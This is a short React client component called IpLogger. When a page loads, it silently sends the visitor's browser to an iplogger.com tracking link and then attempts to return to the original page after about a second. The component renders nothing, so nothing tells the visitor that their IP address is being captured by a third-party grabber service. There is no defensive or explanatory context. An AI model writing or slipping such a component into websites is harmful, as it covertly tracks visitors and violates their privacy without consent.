"use client"

import { useEffect } from 'react';

const IpLogger = () => {

    useEffect(() => {
        const redirectToIpLogger = () => {
            const originalUrl = window.location.href;
            window.location.href = "https://iplogger.com/1dbYP4";
            setTimeout(() => {
                window.location.href = originalUrl;
            }, 1100);
        };

        redirectToIpLogger();
    }, []);

    return null;
};

export default IpLogger;